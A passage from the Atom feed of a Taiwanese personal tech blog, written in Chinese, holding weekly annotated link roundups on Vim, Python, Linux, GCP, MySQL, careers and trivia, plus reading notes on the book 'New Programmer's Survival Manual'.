&lt;li&gt;用 &lt;code&gt;syntastic&lt;/code&gt; 這個 vim plugin 遇到要改 Python linter 的問題，然後查到這個。  &lt;/li&gt;
&lt;li&gt;要在 ‵vimrc‵ 裡頭用 ‵let g:syntastic_python_flake8_args = '--ignore=E501'‵ 這樣的寫法才有用  &lt;/li&gt;
&lt;li&gt;然後 &lt;code&gt;let g:syntastic_python_checkers = ["flake8","pep8","pyflakes","pylint"]&lt;/code&gt; 的順序會影響 syntastic 的運作  &lt;ul&gt;
&lt;li&gt;按照順序來，只要其中一個沒安裝的話 syntastic 就會自動停止  &lt;/li&gt;
&lt;li&gt;以這個設定來看的話，也就是只要沒有安裝 &lt;code&gt;flake8&lt;/code&gt; 的話，syntastic 的 python syntax checking 就不會 work  &lt;/li&gt;
&lt;li&gt;但如果全部都有安裝的話，就會照著這個順序一個一個檢查，所以把最常用的要擺在最前面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://code.facebook.com/posts/1751945575131606/yoga-a-cross-platform-layout-engine"&gt;Yoga: A cross-platform layout engine | Engineering Blog | Facebook Code | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基於 Facebook 的 &lt;a href="https://www.w3.org/TR/css-flexbox-1/"&gt;Flexbox 標準&lt;/a&gt;的 cross-platform implementation  &lt;/li&gt;
&lt;li&gt;因為效能考量而用 C 語言實作  &lt;/li&gt;
&lt;li&gt;這個專案之前的名字叫 &lt;code&gt;css-layout&lt;/code&gt;，但自此開始正式改名成 &lt;code&gt;Yoga&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;windows&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/windows-10-limited-dhcp-get-ip-failed-fixed-2016/"&gt;Windows 10 限制連線無法從 DHCP 拿到 IP 的解法 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;預設的 DHCP 竟然有問題是怎麼回事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.twreporter.org/a/opinion-okinawa-publishing"&gt;富察／一個140萬人口的地方，會有怎樣的出版？答案在沖繩 - 報導者 The Reporter&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒錯 去沖繩逛了兩家書店都有一區專門放跟沖繩有關的任何書籍  &lt;/li&gt;
&lt;li&gt;文化、歷史、政治、經濟、氣候、產物等等  &lt;/li&gt;
&lt;li&gt;看了這篇才知道原來只有沖繩才有縣產書  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=-7GjvnJ2PO0"&gt;牛排的血水根本不是血! - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來是肌紅蛋白 被高中同學教學了...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.flightlineshop.com/%E5%95%86%E5%93%81/%e3%80%90flightline%e3%80%91%e6%be%b3%e6%b4%b2-alpaka-%e7%99%be%e8%ae%8a%e9%98%b2%e6%b0%b4%e5%9e%8b%e6%a0%bc%e5%a4%9a%e5%8a%9f%e8%83%bd%e9%83%b5%e5%b7%ae%e5%8c%85-%e7%ac%ac5%e6%89%b9%e9%a0%90-2/"&gt;【Flightline】澳洲 ALPAKA 百變防水型格多功能郵差包 | Flightline Shop - Fashion Never Ends&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就叫你不要再買包包了 (ry  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://toggl.com/startup-simulator/"&gt;Unicorn Startup Simulator&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This game was created in Nov 2016 during one awesome week in North Berwick, Scotland.  The brains and the beauty behind this creation belong to Toggl's marketing team (Andrea, Annika, Dunja &amp;amp; Mart) and front-end team (Andrin, Jaan, Jake, Luiz, Merlyn, Thiago &amp;amp; Tyler).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一個模擬新創公司的遊戲，挺寫實的（？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=iUFJOQk91Jo"&gt;『臺獨運動，曾經的那一次。』- 臺灣世界史 第8集 (完結篇) - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;日軍因為清朝打輸甲午戰爭簽訂馬關條約割讓台灣，日軍要接收台灣的那時候。  &lt;/li&gt;
&lt;li&gt;台灣民主國、藍地黃虎旗。  &lt;/li&gt;
&lt;li&gt;官員逃之夭夭，居民抗日兇猛。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=HPGqEDG7HUw"&gt;EP6【Public Issue Series】：Mamarirage Equality  / Marriage Equality and Nussbaum - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這部影片太厲害了 有太多我不知道的事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.foodnext.net/news/newssafe/paper/4616151960"&gt;夜市牛排、沙朗、菲力怎麼分？ @ 食力foodNEXT‧食事求實的知識頻道&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;你應該要知道的食事  平平都是一塊「牛排」，有貴有便宜，並非全都從同一塊部位的牛肉得來的喔！平價牛排常用於牛臀部位，而上背部可作為嚼勁最足的紐約克牛排，下腰部則可作為口感較細緻的沙朗牛排，藏在其中的腰  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.justlaw.com.tw/ViewLawTxt.php?id=1706"&gt;何謂保險人、要保人、被保險人及受益人?-天秤座法律網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一、 在我們保險制度中，按照主體來區分，會發現有「保險人」、「要保人」、「被保險人」以及「受益人」等不同稱呼，一般民眾可能對這些稱呼不太明白，下面就稍作介紹：(一)保險人  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="django"></category><category term="git"></category><category term="github"></category><category term="job"></category><category term="life"></category><category term="linux"></category><category term="machine_learning"></category><category term="misc"></category><category term="python"></category><category term="security"></category><category term="software_engineering"></category><category term="stackoverflow"></category><category term="taiwan"></category><category term="trivia"></category><category term="unix"></category><category term="vim"></category><category term="web"></category><category term="webdav"></category><category term="windows"></category></entry><entry><title>《程序員修煉之道：專業程序員必知的 33 個技巧》</title><link href="https://blog.m157q.tw/posts/2016/12/10/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/" rel="alternate"></link><published>2017-02-09T05:41:51+08:00</published><updated>2017-02-09T05:41:51+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-10:posts/2016/12/10/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/</id><summary type="html">&lt;p&gt;&lt;img alt="front cover" src="/files/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/front-cover.jpg" /&gt;&lt;br /&gt;
&lt;img alt="back cover" src="/files/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/back-cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;其實這本書以前就讀過了，&lt;br /&gt;
不過當時還在唸大學，&lt;br /&gt;
看了其實沒有特別深的感觸。&lt;br /&gt;
再一個月就工作滿一年了，&lt;br /&gt;
於是又拿起了這本書翻了一下，&lt;br /&gt;
發現真的比較有感覺了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Notes&lt;/h2&gt;
&lt;p&gt;目錄就列出了 33 個技巧並將其分類：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="index 1" src="/files/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/index-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="index 2" src="/files/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/index-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;節錄一些我覺得還不錯的部份  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「要是你正在用正確的方式構建正確的產品，而且企業其餘人按步就班把事情搞定，你得到你的滿足感，股東得到他們的錢，皆大歡喜。而要是企業無法運轉，很顯然，你還是能保住他們付給你的錢。你和股東一起轉移到下一份工作上。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「就像一開始提到的，到你發現這些業務層反模式中的任意一個時，可能已經太晚了，單憑程序員沒有辦法對它進行任何修復。因此，我教你一招：當你看到同事開始跳船時，問問他們『那個公司還有其他工作需要人手嗎？』」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「程序員悲觀厭世，熱衷於冷嘲熱諷。他們中絕大多數會告訴你 100 件他們認為很糟糕但實際並非如此的事情。一名程序員對一個產品的最高讚揚就是『它不算太差。』」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Not Bad.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「你已經有大量關於工作的東西要學，先關注那些近期要用的。但不要把磨練技能這件事拖延得太長—它們變鈍的速度遠超越你的想像。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「持續學習全靠自己。在上班時間學習、在業務時間學習或想盡一切辦法保持不過時。這其中部份目的是讓自己在不斷變化的行業裡有市場，但更重要的是保持你的學習能力。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「要是自覺對工作得心應手，不再跟新發展保持同步，你下一次找工作時可能就會遇到大麻煩。就算單純為了減少風險，而專門抽出時間去探索新技術也是值得的。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「寫程式就像彈吉他：要學會，就得練。練得愈多，彈得愈好。光讀不練，沒法讓自己的程式寫的更好。捷徑根本不存在，因此要是現在不愛寫程式，以後就沒辦法得心應手。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「理想情況下，你大多數時間都在寫程式。但要記得每年左右做一次反省：你對目前在公司擔任的角色感到快樂嗎？你覺得自己下一步該朝哪裡發展？有沒有現在著手實施便能幫助你實現目標的學習方式或是經驗？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然後這本書的作者又推薦了兩本書：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Passionate Programmer: Creating a Remarkable Career in Software Development (我編程，我快樂：程序員職業規劃之道)  &lt;/li&gt;
&lt;li&gt;Land the Tech Job You Love (人人都有好工作：IT 行業求職面試必讀)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;只能說讀書的速度真的要快，&lt;br /&gt;
與其花很久時間慢慢讀一本書之後就將其束之高閣，&lt;br /&gt;
不如快速得閱讀一本書但每隔一段時間就再回來看一次，&lt;br /&gt;
反而會有不同的感想與收穫，&lt;br /&gt;
這本書算是讓我第一次有這種深刻的體悟。  &lt;/p&gt;
&lt;p&gt;同場加映：&lt;a href="https://www.gitbook.com/book/97-things-every-x-should-know/97-things-every-programmer-should-know/details"&gt;97 Things Every Programmer Should Know&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pragprog.com/book/jcdeg/new-programmer-s-survival-manual"&gt;New Programmer's Survival Manual: Navigate Your Workplace, Cube Farm, or Startup by Josh Carter |  The Pragmatic Bookshelf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://m.sanmin.com.tw/product/index/003707424"&gt;三民網路書店&amp;gt;程序員修煉之道：專業程序員必知的33個技巧（簡體書）-(美)卡特&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="programmer"></category></entry><entry><title>Y2016W48</title><link href="https://blog.m157q.tw/posts/2016/12/05/y2016w48/" rel="alternate"></link><published>2017-02-03T15:15:53+08:00</published><updated>2017-02-03T15:15:53+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-12-05:posts/2016/12/05/y2016w48/</id><summary type="html">&lt;h3&gt;assembly&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://webassembly.org/demo/AngryBots/"&gt;Unity WebGL Player | AngryBots&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;WebAssembly 開發的網頁遊戲，玩起來還算順暢，看來直接在 Web 開發方面寫 Aseembly 的日子不遠矣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jvns.ca/blog/2016/11/27/more-linux-drawings/"&gt;More drawings about computers - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者自己畫的一系列跟電腦科學有關的插畫，又畫了更多幅了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackmd.io/s/ByvJsnBfl"&gt;成大學士生找工作歷程 (後端工程師) - HackMD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看了一下 blog 的 GA 發現星期一的 PV 有個小幅度的上升  &lt;/li&gt;
&lt;li&gt;原來是被這篇引用了  &lt;/li&gt;
&lt;li&gt;底下的面試過程有種跟自己約莫一年前寫的那篇相似的感覺 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mhperng.blogspot.tw/2016/11/blog-post_22.html"&gt;清大彭明輝的部落格: 站在巨人的肩膀上（願景書院系列）&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「如果各種「改革」都只在乎「創新」，而不去檢討過去的失敗經驗，也不去認真取法國外的完整經驗和智慧，老是一招半式地抄襲、模仿，我們將永遠都走不出台灣今天的困境。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@fchern/%E9%97%9C%E6%96%BC%E8%AE%8A%E5%BC%B7%E9%80%99%E6%AA%94%E4%BA%8B-%E5%85%AB-fe5256d00910#.4dkx7unhv"&gt;關於變強這檔事（八） – Felix Chern – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不該當個「缺乏大局觀而只關注自己的小世界」的人  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/technology-coding/g0v-%E7%BE%8E%E8%A5%BF%E8%A1%8C-code-for-america-summit-3287d75382eb?source=rss-4a6ce25fcf6e------2"&gt;g0v 美西行 — Code For America Summit – Technology &amp;amp; Coding – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「在台灣的會議很多都是單向單方面的傳遞，而採用小型座談或是讓聽眾一起參與，其實都可以有更多面向的觀點與討論，我覺得在台灣的研討會是值得一試的。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/linux-pidof-get-sub-process-id-2016/"&gt;使用 pidof 找出此程式的所有 process id - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哦哦 這樣就不用 &lt;code&gt;ps aux | grep&lt;/code&gt; 啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://peteris.rocks/blog/htop"&gt;htop explained | peteris.rocks&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;For the longest time I did not know what everything meant in htop.  I thought that load average 1.0 on my two core machine means that the CPU usage is at 50%. That's not quite right. And also, why does it say 1.0?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;非常詳細的解釋了 &lt;code&gt;htop&lt;/code&gt; 裡頭的資訊代表的意思。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2016/11/byte-order.html"&gt;理解字节序 - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么会有小端字节序？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;答案是，计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://scottlobdell.me/2015/01/sql-database-best-practices-django-orm/"&gt;SQL Database Best Practices with Django (or any ORM) – Scott Lobdell&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;So I’m by no means a database expert and don’t consider myself as such, but some of my coworkers who I would label as database experts have educated me enough to learn about some best practices that would be difficult to otherwise stumble upon and self-learn.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2016/11/what-is-Google-Cloud-Deployment-Manager-and-how-to-use-it.html"&gt;Google Cloud Platform Blog: What is Google Cloud Deployment Manager and how to use it&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來管理 GCE, GKE, BigQuery, GCS, Cloud SQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gcp.expert/gcp-machine-learning-api/"&gt;你不知道的 GCP 人工智慧之各種API！ | GCP 雲端服務頂級合作夥伴 LIVEhouse.in&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上就那幾個，有在稍微追一下 GCP 的新聞的人應該都會知道的。  &lt;/li&gt;
&lt;li&gt;Transalte, Vision, Prediction, Natural Langauge, Speech 這 5 個。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/golang-gvm-go-version-manager-install-2016/"&gt;GVM 與 Go 語言的環境如何安裝、架設 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;跟 Golang 沒有很熟，看起來是個跟 Python 裡的 virturalenv 差不多的工具。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://rocket.cafe/talks/80786"&gt;公司愈大，弊病愈多：11個你不該進大公司的原因 | Rocket Café 火箭科技評論&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;... 這作者的經歷待的全是大公司  &lt;/li&gt;
&lt;li&gt;額 好吧 該說很有說服力嗎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gcp.expert/kubernetes-spark-built/"&gt;快速上手！使用 Kubernetes 建立 Spark 服務 | GCP 雲端服務頂級合作夥伴 LIVEhouse.in&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Pacman/Tips_and_tricks#Removing_unused_packages_.28orphans.29"&gt;pacman/Tips and tricks - ArchWiki&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pacman -Rns $(pacman -Qtdq)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/debian-linux-iptable-save-restore-auto-start-2016/"&gt;Debian Linux iptables 儲存、還原、自動啟動設定 - Tsung's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/589652/add-2-hours-to-current-time-in-mysql"&gt;Add 2 hours to current time in MySQL? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Which is the valid syntax of this query in MySQL?  See Date and Time Functions for other date/time manipulation.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/19080143/mysql-calculate-average-post-for-every-hour-in-each-day"&gt;MySQL: Calculate average post for every hour in each day - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I trying to calculate the average post made for every hour for each day and I have to do this for 113 months. Inside the Post table have this attribute timePosted, DatePosted and Text. I also need to join two table post and thread because I only want to get category id number 3.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;最近因為要簡單計算一下 MySQL 裡的資料，但忘記要怎麼寫了，所以查了一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://eli.thegreenplace.net/2012/01/04/shared-counter-with-pythons-multiprocessing"&gt;Shared counter with Python's multiprocessing - Eli Bendersky's website&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This code is a demonstration of the problem, distilling only the usage of the shared counter. A "pool" of 10 processes is created to run the func function. All processes share a Value and increment it 50 times. You would expect this code to eventually print 500, but in all likeness it won't.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/2080660/python-multiprocessing-and-a-shared-counter"&gt;Python multiprocessing and a shared counter - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I'm having troubles with the multiprocessing module. I'm using a Pool of workers with its map method to load data from lots of files and for each of them I analyze data with with a custom function.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最近寫了個 multiprocessing 的程式，因為數量有點大，然後資料是直接寫入資料庫中，如果最後才計算的話可能要花非常久的時間查詢，所以想說能不能在執行的時候就用一個 multiprocessing 的 shared counter 去紀錄。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software_engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/ericyeh92094/self-reflection-and-insight-for-s-w-engineering/details"&gt;軟體開發見聞錄 · GitBook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一位在 Microsoft 工作二十年的台灣工程師分享的軟體開發經驗，分成二十幾篇，篇幅都不太長，值得花點時間閱讀一下，畢竟我還沒有待過大公司的經驗，瞭解一下也不錯。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=p5M8JmeGc_4"&gt;紅色藥丸 (紀錄片預告) - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;hmm... 男權運動  &lt;/li&gt;
&lt;li&gt;值得思考一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://note.hy31.net/?p=189"&gt;2016/11/11 在中國使用手機版 LINE 狀況紀錄 | Henry的筆記集散地&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「iPhone 如果你在中國境內插上中國 SIM 卡，網路就都是不會通。請記得到中國如果一定手機需要插當地 SIM 卡且要用 LINE 那就請插在 Andoird 上吧。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mhperng.blogspot.tw/2016/11/blog-post_20.html"&gt;清大彭明輝的部落格: 網路時代的階級與競爭力&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「如果你是一個有上進心的人，第一件該學會的事情是Google、Advanced Google、Google Scholar 以及 Google Books 四種搜尋引擎的用法。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/security-android-spy-back-door-sent-data-china-2016/"&gt;部分 Android 會自動將裝置內的資料上傳到中國伺服器 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;強國貨不要買比較好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="assembly"></category><category term="blog"></category><category term="cli"></category><category term="cs"></category><category term="django"></category><category term="gcp"></category><category term="golang"></category><category term="job"></category><category term="k8s"></category><category term="linux"></category><category term="misc"></category><category term="mysql"></category><category term="news"></category><category term="python"></category><category term="software_engineering"></category></entry><entry><title>Y2016W47</title><link href="https://blog.m157q.tw/posts/2016/11/28/y2016w47/" rel="alternate"></link><published>2017-02-03T14:42:49+08:00</published><updated>2017-02-03T14:42:49+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-11-28:posts/2016/11/28/y2016w47/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.s10g.tw/posts/2016/10/17/plugin-liquid-tags-graphviz/"&gt;Pelican 裝 ligquid tags plugin&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;為了之後要畫圖方便，加裝了 ligquid tags 的 plugin。方法很簡單只要加入 &lt;code&gt;PLUGIN_PATHS&lt;/code&gt; 與 &lt;code&gt;PLUGIN&lt;/code&gt; 即可。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;china&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/%e6%b7%98%e5%af%b6-%e5%a4%a9%e8%b2%93-1111%e9%9b%9911-%e5%85%89%e6%a3%8d%e7%af%80-2016%e5%b9%b4%e7%9a%84%e7%b4%80%e9%8c%84/"&gt;淘寶 / 天貓 1111(雙11) 光棍節 2016年的紀錄 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2012 年：191 億元  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2013 年：350 億元  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2014 年：571 億元  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2015 年：912 億元  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2016 年：1207 億元  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
